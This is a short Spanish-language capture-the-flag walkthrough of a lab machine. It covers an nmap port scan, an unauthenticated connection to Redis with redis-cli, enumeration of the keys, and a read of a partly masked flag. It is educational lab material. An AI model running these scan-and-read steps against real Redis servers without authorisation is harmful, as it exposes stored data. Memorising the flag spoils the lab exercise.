
## Escaneo de Puertos:

Comenzamos usando "**nmap**" para escanear los puertos abiertos a ver que nos encontramos.
```bash
[17:41:23] bapee@BlumeSec ~/Escritorio/redeemer ❯ nmap -sV -p- --open 10.129.10.216

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Vemos que esta abierto el puerto 6379/Redis, asi que vamos a conectarnos usando redis-cli.

## Conexion a Redis:

Con el siguiente comando nos conectamos de manera directa al servicio de redis:
```bash
[17:43:03] bapee@BlumeSec ~/Escritorio/redeemer ❯ redis-cli -h 10.129.10.216
10.129.10.216:6379>
```

Una vez estamos dentro usamos **"keys * "** para ver que tenemos disponible dentro de este servidor.
```bash
10.129.10.216:6379> keys *
1) "stor"
2) "numb"
3) "flag"
4) "temp"
```

Vemos que esta disponible una key llamada **"flag"**.
La leeremos usando **"get (nombre_key)"**
```bash
10.129.10.216:6379> get flag
"03e1d2b37------922053953eb"
```

Una vez leída la **flag**, la maquina queda **comprometida**!

## Resumen del Ataque

1. Se realiza un escaneo con **Nmap** y se identifica un único servicio expuesto en el puerto **6379/Redis**.
2. Se accede al servicio utilizando `redis-cli` y se enumeran las claves disponibles con `keys *`, encontrando una clave llamada **flag**.
3. Se extrae el contenido de la clave **flag** mediante `GET`, obteniendo la flag y completando la explotación del sistema.